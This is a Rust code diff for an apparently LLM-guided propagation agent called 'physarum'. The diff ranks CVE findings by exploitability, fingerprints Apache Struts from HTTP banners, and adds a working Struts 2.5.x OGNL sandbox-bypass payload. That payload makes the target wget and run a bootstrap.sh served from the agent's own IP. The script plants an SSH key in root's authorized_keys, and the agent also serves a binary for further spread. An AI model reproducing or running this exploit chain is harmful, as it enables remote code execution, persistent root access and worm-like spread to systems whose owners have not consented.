@@ -21,7 +21,8 @@ use physarum_llm::{
     ArtifactType, BootstrapAction, DiscoveryQuery, ExecutionResultSummary, LlmAttemptEvidence,
     LlmClient, NextAction, OsHint, OsHintSource, PatternFindingSummary, PolicyDecision, PolicyGate,
     PolicyRejectionReason, PortScan, PortState, PropagationMethod, PropagationMethodClass,
-    RejectedStrategy, TemplateMeta, TemplateSelectionQuery, TransportProtocol, MAX_ATTEMPTS,
+    RejectedStrategy, TemplateMeta, TemplateSelectionQuery, TransportProtocol, VulnerabilitySource,
+    MAX_ATTEMPTS,
 };
 use physarum_scanner::{
     effective_stimulus_ports, result_from_open_port, EvidenceSource as ScanEvidenceSource,
@@ -94,8 +95,19 @@ pub async fn run(
             resp.selected_ids
         }
         Err(e) => {
-            tracing::warn!(%target, err = %e, "LLM Turn 1 (template selection) failed — running all templates");
-            vec![] // empty = no filter (run all)
+            // Fall back to the catalog shown to the LLM rather than all templates.
+            // Running all templates (2126+) causes false positive matches and noise.
+            let catalog_ids: Vec<String> = selection_query
+                .available_templates
+                .iter()
+                .map(|t| t.id.clone())
+                .collect();
+            tracing::warn!(
+                %target, err = %e,
+                fallback_count = catalog_ids.len(),
+                "LLM Turn 1 (template selection) failed — falling back to catalog"
+            );
+            catalog_ids
         }
     };
 
@@ -128,6 +140,20 @@ pub async fn run(
         tracing::info!(%target, ?cve_ids, "CVE candidates in DiscoveryQuery");
     }
 
+    // Rank findings by propagation weight (PhysarumSpore × RCE × CVSS).
+    // Each attempt presents ONE candidate to the LLM, cycling through the ranked list.
+    // This focuses the LLM on the highest-value exploit path per attempt rather than
+    // overwhelming it with all findings and letting it choose arbitrarily.
+    let ranked_candidates = rank_propagation_candidates(&pattern_summaries);
+    if !ranked_candidates.is_empty() {
+        tracing::info!(
+            %target,
+            candidate_count = ranked_candidates.len(),
+            top_cve = %ranked_candidates[0].check_id,
+            "ranked CVE propagation candidates"
+        );
+    }
+
     // ── Ephemeral SSH keypair (Exploit class only) ────────────────────────────
     // Generated once per target visit — the same pubkey is embedded in every
     // DiscoveryQuery so the LLM can plant it via RCE in any attempt.
@@ -136,6 +162,11 @@ pub async fn run(
         match generate_ephemeral_keypair().await {
             Ok(k) => {
                 tracing::info!(%target, pubkey = %k.pubkey, "ephemeral SSH keypair generated");
+                // Write bootstrap.sh so the binary server can serve it at /bootstrap.sh.
+                // The OGNL payload only needs to wget this URL — no pubkey or complex shell in the URL.
+                if let Err(e) = write_bootstrap_script(&k.pubkey).await {
+                    tracing::warn!(%target, err = %e, "bootstrap script write failed — wget pubkey path unavailable");
+                }
                 Some(k)
             }
             Err(e) => {
@@ -150,6 +181,16 @@ pub async fn run(
     let mut rejected: Vec<RejectedStrategy> = Vec::new();
 
     for attempt_number in 1..=MAX_ATTEMPTS {
+        // Present ONE ranked candidate per attempt so the LLM focuses on the
+        // highest-weight exploit path. Cycle through ranked_candidates across
+        // attempts; fall back to all summaries when there are no ranked ones.
+        let attempt_findings: Vec<PatternFindingSummary> = if ranked_candidates.is_empty() {
+            pattern_summaries.clone()
+        } else {
+            let idx = (attempt_number as usize - 1) % ranked_candidates.len();
+            vec![ranked_candidates[idx].clone()]
+        };
+
         let query = DiscoveryQuery {
             target: IpAddr::V4(target),
             ports: port_scans.clone(),
@@ -162,7 +203,7 @@ pub async fn run(
                 .collect(),
             rejected_strategies: rejected.clone(),
             attempt_number,
-            pattern_findings: pattern_summaries.clone(),
+            pattern_findings: attempt_findings,
             source_ip: local_ip.map(IpAddr::V4),
             ephemeral_pubkey: ephemeral_key.as_ref().map(|k| k.pubkey.clone()),
         };
@@ -280,7 +321,7 @@ pub async fn run(
 
         // ── Execute bootstrap ─────────────────────────────────────────────────
         let key_path = ephemeral_key.as_ref().map(|k| k.privkey_path.as_path());
-        let exec_result = execute_bootstrap(&strategy, target, key_path).await;
+        let exec_result = execute_bootstrap(&strategy, target, key_path, local_ip).await;
 
         // Shut down binary server after bootstrap attempt.
         if let Some(h) = binary_server {
@@ -463,7 +504,17 @@ async fn grab_banner(target: Ipv4Addr, port: u16) -> Option<String> {
     use tokio::time::{timeout, Duration};
 
     const TIMEOUT_MS: u64 = 1_500;
-    const MAX_BYTES: usize = 256;
+    // HTTP ports: larger buffer so the response body (e.g. page <title>) reaches
+    // the LLM Turn 1 query alongside the server header. 256 bytes was too small —
+    // HTTP response headers alone can exceed 256 bytes, cutting the HTML body
+    // that contains application-specific version strings (e.g. "S2-059 demo" for
+    // Apache Struts CVE-2020-17530). Non-HTTP ports keep the 256-byte cap since
+    // their banners are short text strings.
+    let is_http_port = matches!(
+        port,
+        80 | 3000 | 5000 | 5984 | 7080 | 8000 | 8080 | 8888 | 9000 | 9090 | 9200 | 9999
+    );
+    let max_bytes: usize = if is_http_port { 2048 } else { 256 };
 
     let addr = SocketAddr::new(IpAddr::V4(target), port);
     let mut stream = timeout(Duration::from_millis(TIMEOUT_MS), TcpStream::connect(addr))
@@ -473,10 +524,7 @@ async fn grab_banner(target: Ipv4Addr, port: u16) -> Option<String> {
 
     // Send a minimal HTTP probe for plain-HTTP ports to elicit a response header.
     // TLS ports (443/8443/9443) are skipped — the TLS handshake would be binary.
-    if matches!(
-        port,
-        80 | 3000 | 5000 | 5984 | 7080 | 8000 | 8080 | 8888 | 9000 | 9090 | 9200 | 9999
-    ) {
+    if is_http_port {
         let _ = timeout(
             Duration::from_millis(TIMEOUT_MS),
             stream.write_all(b"GET / HTTP/1.0\r\nHost: physarum\r\nConnection: close\r\n\r\n"),
@@ -484,7 +532,7 @@ async fn grab_banner(target: Ipv4Addr, port: u16) -> Option<String> {
         .await;
     }
 
-    let mut buf = vec![0u8; MAX_BYTES];
+    let mut buf = vec![0u8; max_bytes];
     let n = timeout(Duration::from_millis(TIMEOUT_MS), stream.read(&mut buf))
         .await
         .ok()?
@@ -555,9 +603,15 @@ fn upgrade_with_banner(
     r
 }
 
-/// Scan `raw` for common server version strings (nginx, Apache, OpenSSH, …).
+/// Scan `raw` for server version strings and application-level framework hints.
+///
+/// Returns a combined hint such as "Jetty/9.4.31.v20200723 (Apache Struts S2-059)"
+/// so that LLM Turn 1 can match service-specific CVE templates for each open port.
 fn extract_version_hint(raw: &str) -> Option<String> {
     let b = raw.to_ascii_lowercase();
+
+    // Server-level version patterns from HTTP headers or protocol banners.
+    let mut server_ver = None;
     for pat in &[
         "nginx/",
         "apache/",
@@ -573,9 +627,48 @@ fn extract_version_hint(raw: &str) -> Option<String> {
                 .find(|c: char| c.is_whitespace())
                 .map(|e| pos + e)
                 .unwrap_or_else(|| raw.len().min(pos + 32));
-            return Some(raw[pos..end].to_string());
+            server_ver = Some(raw[pos..end].to_string());
+            break;
         }
     }
+
+    // Application-level framework hint from HTML <title> (e.g. "Apache Struts S2-059").
+    let app_hint = extract_app_hint_from_html(&b);
+
+    match (server_ver, app_hint) {
+        (Some(sv), Some(ah)) => Some(format!("{sv} ({ah})")),
+        (Some(sv), None) => Some(sv),
+        (None, Some(ah)) => Some(ah),
+        (None, None) => None,
+    }
+}
+
+/// Detect application-level framework from the HTML `<title>` in an HTTP banner.
+///
+/// Recognises Struts Security Advisory IDs (S2-001…S2-065+) which appear as page
+/// titles in CVE demo/lab containers (e.g. "S2-059 demo" → "Apache Struts S2-059").
+/// Returns a short, LLM-readable hint; returns `None` for non-matching pages.
+fn extract_app_hint_from_html(lower_raw: &str) -> Option<String> {
+    let title_start = lower_raw.find("<title>")? + 7;
+    let title = lower_raw[title_start..].split("</title>").next()?.trim();
+
+    if title.is_empty() {
+        return None;
+    }
+
+    // Apache Struts Security Advisory IDs: S2-001 through S2-065 and beyond.
+    if let Some(s2_idx) = title.find("s2-") {
+        let advisory = &title[s2_idx..];
+        let end = advisory
+            .find(|c: char| !c.is_alphanumeric() && c != '-')
+            .unwrap_or_else(|| advisory.len().min(8));
+        let id = advisory[..end].to_uppercase(); // "S2-059"
+        return Some(format!("Apache Struts {id}"));
+    }
+    if title.contains("struts") {
+        return Some("Apache Struts".to_string());
+    }
+
     None
 }
 
@@ -1122,6 +1215,7 @@ async fn execute_bootstrap(
     strategy: &physarum_llm::PropagationStrategy,
     target: Ipv4Addr,
     key_path: Option<&Path>,
+    source_ip: Option<Ipv4Addr>,
 ) -> ExecutionResultSummary {
     let plan = match &strategy.bootstrap_plan {
         Some(p) => p,
@@ -1134,9 +1228,15 @@ async fn execute_bootstrap(
     };
 
     for (i, step) in plan.steps.iter().enumerate() {
-        match execute_step(&step.action, target, step.timeout_ms, key_path).await {
+        match execute_step(&step.action, target, step.timeout_ms, key_path, source_ip).await {
             StepResult::Ok | StepResult::Simulated => {
                 tracing::debug!(%target, step = i, "step ok");
+                // After an HttpPost RCE step, allow time for the spawned subprocess
+                // (wget + sh bootstrap.sh) to complete before the next SCP/SSH step.
+                // ProcessBuilder.start() is non-blocking — the shell script runs async.
+                if matches!(step.action, BootstrapAction::HttpPost { .. }) {
+                    tokio::time::sleep(std::time::Duration::from_millis(2000)).await;
+                }
             }
             StepResult::Failed(reason) => {
                 tracing::warn!(%target, step = i, %reason, "step failed");
@@ -1186,11 +1286,115 @@ fn ssh_opts(key_path: Option<&Path>) -> Vec<String> {
     opts
 }
 
+/// Resolve placeholders in an HttpPost/HttpGet path before constructing the URL.
+///
+/// Substitutions performed:
+///   `<source_ip>` → the agent's own IP address (used in wget/curl URLs)
+///   `__struts_bypass__` → the full URL-encoded Struts 2.5.x SecurityMemberAccess bypass OGNL
+///     that downloads and executes bootstrap.sh via freemarker.Execute.
+///     Internally expanded to TWO requests (wget step then sh step) by execute_step.
+///
+/// Scope: `__struts_bypass__` is an adapter for the Apache Struts S2/OGNL CVE family
+/// only — not the generic exploitation model. The generic per-CVE delivery path
+/// (ExploitReference + ExploitExecutionRecipe) is future work tracked by #144.
+fn resolve_http_path(path: &str, source_ip: Option<Ipv4Addr>) -> String {
+    let ip_str = source_ip.map(|ip| ip.to_string()).unwrap_or_default();
+    path.replace("<source_ip>", &ip_str)
+}
+
+/// Expand `__struts_bypass__` to the wget-only OGNL URL (step 1 of 2).
+/// freemarker.Execute concatenates arglist to a single string for Runtime.exec(String),
+/// so the command must be a single space-separated token string with no shell operators.
+fn resolve_struts_wget(path: &str, source_ip: Option<Ipv4Addr>) -> Option<String> {
+    let ip_str = source_ip.map(|ip| ip.to_string())?;
+    if !path.contains("__struts_bypass__") || ip_str.is_empty() {
+        return None;
+    }
+    let cmd = format!(
+        "wget -q http://{}:8001/bootstrap.sh -O /tmp/bootstrap.sh",
+        ip_str
+    );
+    let encoded_ognl = build_struts_bypass_ognl(&cmd);
+    Some(path.replace("__struts_bypass__", &encoded_ognl))
+}
+
+/// Expand `__struts_bypass__` to the sh-only OGNL URL (step 2 of 2).
+fn resolve_struts_sh(path: &str) -> Option<String> {
+    if !path.contains("__struts_bypass__") {
+        return None;
+    }
+    let cmd = "sh /tmp/bootstrap.sh";
+    let encoded_ognl = build_struts_bypass_ognl(cmd);
+    Some(path.replace("__struts_bypass__", &encoded_ognl))
+}
+
+/// Construct the Struts 2.5.x SecurityMemberAccess bypass OGNL expression URL-encoded
+/// for embedding in a `?id=` query parameter.
+///
+/// freemarker.Execute.exec(list) concatenates all list elements into a single string and
+/// passes it to Runtime.exec(String) which tokenizes by whitespace. Therefore `cmd` must
+/// be a single tokenizable string (e.g. "wget -q http://... -O /tmp/file" or "sh /tmp/file").
+/// Do NOT use "bash -c <cmd>" — the shell command gets split off as bash's $0, not the script.
+///
+/// Called twice for the Struts S2-bypass: once with the wget command, once with sh.
+fn build_struts_bypass_ognl(cmd: &str) -> String {
+    let ognl = format!(
+        concat!(
+            r#"(#instancemanager=#application["org.apache.tomcat.InstanceManager"])"#,
+            r#".(#stack=#attr["com.opensymphony.xwork2.util.ValueStack.ValueStack"])"#,
+            r#".(#bean=#instancemanager.newInstance("org.apache.commons.collections.BeanMap"))"#,
+            r#".(#bean.setBean(#stack))"#,
+            r#".(#context=#bean.get("context"))"#,
+            r#".(#bean.setBean(#context))"#,
+            r#".(#macc=#bean.get("memberAccess"))"#,
+            r#".(#bean.setBean(#macc))"#,
+            r#".(#emptyset=#instancemanager.newInstance("java.util.HashSet"))"#,
+            r#".(#bean.put("excludedClasses",#emptyset))"#,
+            r#".(#bean.put("excludedPackageNames",#emptyset))"#,
+            r#".(#arglist=#instancemanager.newInstance("java.util.ArrayList"))"#,
+            r#".(#arglist.add("{cmd}"))"#,
+            r#".(#execute=#instancemanager.newInstance("freemarker.template.utility.Execute"))"#,
+            r#".(#execute.exec(#arglist))"#,
+        ),
+        cmd = cmd
+    );
+    percent_encode_ognl(&ognl)
+}
+
+/// URL-encode an OGNL expression for embedding as a query string value.
+/// Wraps with `%25%7B` ... `%7D` so the server sees `%{...}` (double evaluation).
+/// Only alphanumerics, `.`, `-`, and `_` are left unencoded; everything else is `%XX`.
+fn percent_encode_ognl(ognl: &str) -> String {
+    let mut encoded = String::with_capacity(ognl.len() * 3);
+    for byte in ognl.bytes() {
+        match byte {
+            b'A'..=b'Z' | b'a'..=b'z' | b'0'..=b'9' | b'.' | b'-' | b'_' => {
+                encoded.push(byte as char);
+            }
+            _ => {
+                encoded.push('%');
+                encoded.push(
+                    char::from_digit((byte >> 4) as u32, 16)
+                        .unwrap()
+                        .to_ascii_uppercase(),
+                );
+                encoded.push(
+                    char::from_digit((byte & 0xF) as u32, 16)
+                        .unwrap()
+                        .to_ascii_uppercase(),
+                );
+            }
+        }
+    }
+    format!("%25%7B{}%7D", encoded)
+}
+
 async fn execute_step(
     action: &BootstrapAction,
     target: Ipv4Addr,
     timeout_ms: u64,
     key_path: Option<&Path>,
+    source_ip: Option<Ipv4Addr>,
 ) -> StepResult {
     use tokio::process::Command;
     use tokio::time::{timeout, Duration};
@@ -1216,7 +1420,54 @@ async fn execute_step(
             accept_any_response,
         } => {
             let p = port.unwrap_or(80);
-            let url = format!("http://{}:{}{}", target, p, path);
+
+            // __struts_bypass__ expands to TWO sequential requests: wget then sh.
+            // freemarker.Execute.exec() concatenates list elements then calls Runtime.exec(String)
+            // which tokenizes by whitespace — so each request must be a single-element command
+            // (no shell, no "bash -c") to work correctly.
+            if let (Some(wget_path), Some(sh_path)) = (
+                resolve_struts_wget(path, source_ip),
+                resolve_struts_sh(path),
+            ) {
+                let client = reqwest::Client::new();
+
+                // Step A: wget bootstrap.sh
+                let wget_url = format!("http://{}:{}{}", target, p, wget_path);
+                tracing::info!(%wget_url, "HTTP POST [struts-bypass wget]");
+                let mut wget_req = client.post(&wget_url).body(body.clone());
+                for (k, v) in headers {
+                    wget_req = wget_req.header(k.as_str(), v.as_str());
+                }
+                match timeout(Duration::from_millis(timeout_ms), wget_req.send()).await {
+                    Ok(Ok(r)) if r.status().is_success() || *accept_any_response => {
+                        tracing::info!(status = r.status().as_u16(), "HTTP POST wget completed");
+                    }
+                    Ok(Ok(r)) => return StepResult::Failed(format!("HTTP {}", r.status())),
+                    Ok(Err(e)) => return StepResult::Failed(e.to_string()),
+                    Err(_) => return StepResult::Failed("timeout".into()),
+                }
+
+                // Step B: sh /tmp/bootstrap.sh (Execute.exec() blocks until sh exits)
+                let sh_url = format!("http://{}:{}{}", target, p, sh_path);
+                tracing::info!(%sh_url, "HTTP POST [struts-bypass sh]");
+                let mut sh_req = client.post(&sh_url).body(body.clone());
+                for (k, v) in headers {
+                    sh_req = sh_req.header(k.as_str(), v.as_str());
+                }
+                return match timeout(Duration::from_millis(timeout_ms), sh_req.send()).await {
+                    Ok(Ok(r)) if r.status().is_success() || *accept_any_response => {
+                        tracing::info!(status = r.status().as_u16(), "HTTP POST sh completed");
+                        StepResult::Ok
+                    }
+                    Ok(Ok(r)) => StepResult::Failed(format!("HTTP {}", r.status())),
+                    Ok(Err(e)) => StepResult::Failed(e.to_string()),
+                    Err(_) => StepResult::Failed("timeout".into()),
+                };
+            }
+
+            // Normal (non-Struts) HTTP POST path.
+            let resolved_path = resolve_http_path(path, source_ip);
+            let url = format!("http://{}:{}{}", target, p, resolved_path);
             tracing::info!(%url, custom_headers = headers.len(), accept_any = accept_any_response, "HTTP POST");
             let client = reqwest::Client::new();
             let mut req = client.post(&url).body(body.clone());
@@ -1389,10 +1640,10 @@ fn method_port(method: &PropagationMethod) -> Option<u16> {
 
 // ── Ephemeral SSH keypair ─────────────────────────────────────────────────────
 
-struct EphemeralKey {
-    privkey_path: PathBuf,
+pub(crate) struct EphemeralKey {
+    pub(crate) privkey_path: PathBuf,
     /// OpenSSH public key string (e.g. "ssh-ed25519 AAAA... physarum-ephemeral").
-    pubkey: String,
+    pub(crate) pubkey: String,
 }
 
 /// Generate an ephemeral ed25519 SSH keypair via `ssh-keygen`.
@@ -1400,7 +1651,7 @@ struct EphemeralKey {
 /// Private key is written to `/tmp/physarum/ephemeral_key` (mode 600).
 /// Public key is returned as an OpenSSH one-liner for embedding in DiscoveryQuery.
 /// Both files are cleaned up by the caller after the exploit loop exits.
-async fn generate_ephemeral_keypair() -> anyhow::Result<EphemeralKey> {
+pub(crate) async fn generate_ephemeral_keypair() -> anyhow::Result<EphemeralKey> {
     use tokio::process::Command;
 
     let key_dir = PathBuf::from("/tmp/physarum");
@@ -1439,39 +1690,136 @@ async fn generate_ephemeral_keypair() -> anyhow::Result<EphemeralKey> {
     })
 }
 
+/// Write `/tmp/physarum/bootstrap.sh` — a shell script that plants the ephemeral pubkey
+/// into `/root/.ssh/authorized_keys` and creates `/tmp/physarum` on the target.
+///
+/// The OGNL payload only needs to `wget` this script and run `sh /tmp/bootstrap.sh`,
+/// keeping the OGNL path short and free of pubkey content or `&&` chains.
+async fn write_bootstrap_script(pubkey: &str) -> anyhow::Result<PathBuf> {
+    use std::os::unix::fs::PermissionsExt;
+    let path = PathBuf::from("/tmp/physarum/bootstrap.sh");
+    // printf '%s\n' is safer than echo: handles keys with dashes/spaces without shell expansion.
+    let content = format!(
+        "#!/bin/sh\nmkdir -p /root/.ssh\nchmod 700 /root/.ssh\nprintf '%s\\n' '{}' >> /root/.ssh/authorized_keys\nchmod 600 /root/.ssh/authorized_keys\nmkdir -p /tmp/physarum\n",
+        pubkey
+    );
+    tokio::fs::write(&path, &content).await?;
+    std::fs::set_permissions(&path, std::fs::Permissions::from_mode(0o755))?;
+    tracing::debug!(path = %path.display(), "bootstrap.sh written");
+    Ok(path)
+}
+
+// ── Propagation candidate ranking ────────────────────────────────────────────
+
+/// Maximum number of ranked CVE candidates cycled through the attempt loop.
+const MAX_PROPAGATION_CANDIDATES: usize = 6;
+
+/// Rank `PatternFindingSummary` entries by propagation weight and return the top
+/// `MAX_PROPAGATION_CANDIDATES` as an ordered list.
+///
+/// Weight formula per candidate:
+///   score = cvss × source_mult × class_mult × confidence
+///   source_mult = 2.0  when source == PhysarumSpore (live template confirmed exploitability)
+///   source_mult = 1.0  for LocalAdvisoryCache / OsvFeed (version-based inference)
+///   class_mult  = 1.5  when exploit_class == "RemoteCodeExecution"
+///   class_mult  = 1.0  otherwise
+///   cvss defaults to 5.0 when absent (mid-range assumption)
+///
+/// Findings with no vulnerability_candidates or is_actionable=false are excluded.
+/// The caller presents ranked[attempt_number - 1] to the LLM so each attempt
+/// focuses on the next-highest-priority exploit path.
+fn rank_propagation_candidates(findings: &[PatternFindingSummary]) -> Vec<PatternFindingSummary> {
+    let candidate_weight = |f: &PatternFindingSummary| -> f32 {
+        f.vulnerability_candidates
+            .iter()
+            .map(|c| {
+                let cvss = c.cvss_score.unwrap_or(5.0);
+                let source_mult = if c.source == VulnerabilitySource::PhysarumSpore {
+                    2.0f32
+                } else {
+                    1.0f32
+                };
+                let class_mult = if c.exploit_class.as_deref() == Some("RemoteCodeExecution") {
+                    1.5f32
+                } else {
+                    1.0f32
+                };
+                cvss * source_mult * class_mult * c.confidence
+            })
+            .fold(0.0f32, f32::max)
+    };
+
+    let mut scored: Vec<(f32, &PatternFindingSummary)> = findings
+        .iter()
+        .filter(|f| f.is_actionable && !f.vulnerability_candidates.is_empty())
+        .map(|f| (candidate_weight(f), f))
+        .collect();
+
+    scored.sort_by(|a, b| b.0.partial_cmp(&a.0).unwrap_or(std::cmp::Ordering::Equal));
+
+    scored
+        .into_iter()
+        .take(MAX_PROPAGATION_CANDIDATES)
+        .map(|(_, f)| f.clone())
+        .collect()
+}
+
 // ── Template catalog builder ─────────────────────────────────────────────────
 
 /// Maximum number of templates sent to the LLM for Turn 1 selection.
-/// CVE-specific templates are included first; remaining are sorted alphabetically.
 const MAX_TEMPLATES_FOR_SELECTION: usize = 200;
 
 /// Build a compact `TemplateMeta` catalog for LLM Turn 1 selection.
 ///
-/// CVE-specific templates (id starts with "CVE-") are always placed first so
-/// the LLM sees the most actionable candidates even when the list is truncated.
-/// The remaining templates are sorted by id for stable ordering.
+/// Sort order (highest priority first so recent high-CVSS RCE templates survive the cap):
+///   1. RCE-tagged CVE templates, sorted by CVSS score descending then id
+///   2. Other CVE templates, sorted by CVSS score descending then id
+///   3. Non-CVE templates, sorted by id
+///
+/// This ensures CVE-2020-17530 (CVSS 9.8, rce tag) appears before the 200-template cap
+/// regardless of how many older CVE templates exist in the library.
 fn build_template_catalog_for_llm(
     templates: &[physarum_sporangium::PatternTemplate],
     _ports: &[PortScan],
 ) -> Vec<TemplateMeta> {
-    let mut cve_first: Vec<&physarum_sporangium::PatternTemplate> = templates
+    let cvss_key = |t: &&physarum_sporangium::PatternTemplate| -> u32 {
+        // Multiply by 10 and round to get a stable integer for sorting.
+        (t.info.cvss_score.unwrap_or(0.0) * 10.0) as u32
+    };
+    let is_rce = |t: &&physarum_sporangium::PatternTemplate| -> bool {
+        t.info
+            .tags
+            .iter()
+            .any(|tag| tag.eq_ignore_ascii_case("rce"))
+    };
+
+    let mut rce_cves: Vec<&physarum_sporangium::PatternTemplate> = templates
         .iter()
-        .filter(|t| t.id.starts_with("CVE-"))
+        .filter(|t| t.id.starts_with("CVE-") && is_rce(t))
+        .collect();
+    let mut other_cves: Vec<&physarum_sporangium::PatternTemplate> = templates
+        .iter()
+        .filter(|t| t.id.starts_with("CVE-") && !is_rce(t))
         .collect();
     let mut rest: Vec<&physarum_sporangium::PatternTemplate> = templates
         .iter()
         .filter(|t| !t.id.starts_with("CVE-"))
         .collect();
 
-    cve_first.sort_by(|a, b| a.id.cmp(&b.id));
+    // Sort each group: CVSS descending, then id ascending for stable ordering
+    rce_cves.sort_by(|a, b| cvss_key(b).cmp(&cvss_key(a)).then_with(|| a.id.cmp(&b.id)));
+    other_cves.sort_by(|a, b| cvss_key(b).cmp(&cvss_key(a)).then_with(|| a.id.cmp(&b.id)));
     rest.sort_by(|a, b| a.id.cmp(&b.id));
-    cve_first.extend(rest);
 
-    cve_first
+    rce_cves.extend(other_cves);
+    rce_cves.extend(rest);
+
+    rce_cves
         .into_iter()
         .take(MAX_TEMPLATES_FOR_SELECTION)
         .map(|t| TemplateMeta {
             id: t.id.clone(),
+            name: t.info.name.clone(),
             severity: format!("{:?}", t.info.severity).to_ascii_lowercase(),
             tags: t.info.tags.clone(),
         })
@@ -1518,22 +1866,48 @@ async fn start_binary_server(local_ip: Ipv4Addr) -> Option<tokio::task::JoinHand
             let binary_path = binary_path.clone();
             tokio::spawn(async move {
                 let mut buf = [0u8; 512];
-                let _ = socket.read(&mut buf).await;
-                match tokio::fs::read(&binary_path).await {
-                    Ok(data) => {
-                        let header = format!(
-                            "HTTP/1.0 200 OK\r\nContent-Type: application/octet-stream\r\nContent-Length: {}\r\n\r\n",
-                            data.len()
-                        );
-                        let _ = socket.write_all(header.as_bytes()).await;
-                        let _ = socket.write_all(&data).await;
-                        tracing::debug!(%peer, bytes = data.len(), "physarum-maze binary served");
+                let n = socket.read(&mut buf).await.unwrap_or(0);
+                let request = std::str::from_utf8(&buf[..n]).unwrap_or("");
+                // Parse the request path from the first line: "GET /path HTTP/1.x"
+                let path = request
+                    .split_whitespace()
+                    .nth(1)
+                    .unwrap_or("/physarum-maze");
+
+                if path == "/bootstrap.sh" {
+                    let script_path = PathBuf::from("/tmp/physarum/bootstrap.sh");
+                    match tokio::fs::read(&script_path).await {
+                        Ok(data) => {
+                            let header = format!(
+                                "HTTP/1.0 200 OK\r\nContent-Type: text/plain\r\nContent-Length: {}\r\n\r\n",
+                                data.len()
+                            );
+                            let _ = socket.write_all(header.as_bytes()).await;
+                            let _ = socket.write_all(&data).await;
+                            tracing::debug!(%peer, bytes = data.len(), "bootstrap.sh served");
+                        }
+                        Err(e) => {
+                            tracing::warn!(%peer, err = %e, "bootstrap.sh not found — was write_bootstrap_script called?");
+                            let _ = socket.write_all(b"HTTP/1.0 404 Not Found\r\n\r\n").await;
+                        }
                     }
-                    Err(e) => {
-                        tracing::warn!(%peer, err = %e, "failed to read binary for exploit server");
-                        let _ = socket
-                            .write_all(b"HTTP/1.0 500 Internal Server Error\r\n\r\n")
-                            .await;
+                } else {
+                    match tokio::fs::read(&binary_path).await {
+                        Ok(data) => {
+                            let header = format!(
+                                "HTTP/1.0 200 OK\r\nContent-Type: application/octet-stream\r\nContent-Length: {}\r\n\r\n",
+                                data.len()
+                            );
+                            let _ = socket.write_all(header.as_bytes()).await;
+                            let _ = socket.write_all(&data).await;
+                            tracing::debug!(%peer, bytes = data.len(), "physarum-maze binary served");
+                        }
+                        Err(e) => {
+                            tracing::warn!(%peer, err = %e, "failed to read binary for exploit server");
+                            let _ = socket
+                                .write_all(b"HTTP/1.0 500 Internal Server Error\r\n\r\n")
+                                .await;
+                        }
                     }
                 }
             });
@@ -1567,4 +1941,59 @@ fn extract_cve_ids(summaries: &[PatternFindingSummary]) -> Vec<String> {
     ids.sort();
     ids.dedup();
     ids
+}
+
+#[cfg(test)]
+mod tests {
+    use super::{extract_app_hint_from_html, extract_version_hint};
+
+    #[test]
+    fn struts_s2_advisory_in_title_detected() {
+        let body = "HTTP/1.1 200 OK\r\nServer: Jetty/9.4.31\r\n\r\n\
+                    <html><head><title>S2-059 demo</title></head></html>";
+        let hint = extract_version_hint(body).unwrap();
+        assert!(hint.contains("Jetty"), "should keep server version: {hint}");
+        assert!(
+            hint.contains("Apache Struts"),
+            "should append app hint: {hint}"
+        );
+        assert!(
+            hint.contains("S2-059"),
+            "should include advisory ID: {hint}"
+        );
+    }
+
+    #[test]
+    fn openssh_version_hint_no_false_positive() {
+        let banner = "SSH-2.0-OpenSSH_9.2p1 Debian-2+deb12u2\r\n";
+        let hint = extract_version_hint(banner).unwrap();
+        assert!(
+            hint.starts_with("OpenSSH_"),
+            "should extract SSH version: {hint}"
+        );
+        assert!(!hint.contains("Struts"), "no Struts in SSH banner: {hint}");
+    }
+
+    #[test]
+    fn jetty_only_no_struts_hint_when_no_title() {
+        let body = "HTTP/1.1 404 Not Found\r\nServer: Jetty/9.4.31\r\n\r\n";
+        let hint = extract_version_hint(body).unwrap();
+        assert_eq!(hint, "Jetty/9.4.31", "plain Jetty without title: {hint}");
+    }
+
+    #[test]
+    fn extract_app_hint_struts_word_in_title() {
+        // extract_app_hint_from_html expects pre-lowercased input (caller convention).
+        let raw = "<title>apache struts showcase</title>";
+        assert_eq!(
+            extract_app_hint_from_html(raw),
+            Some("Apache Struts".to_string())
+        );
+    }
+
+    #[test]
+    fn extract_app_hint_returns_none_for_generic_title() {
+        let raw = "<title>welcome to nginx!</title>";
+        assert!(extract_app_hint_from_html(raw).is_none());
+    }
 }
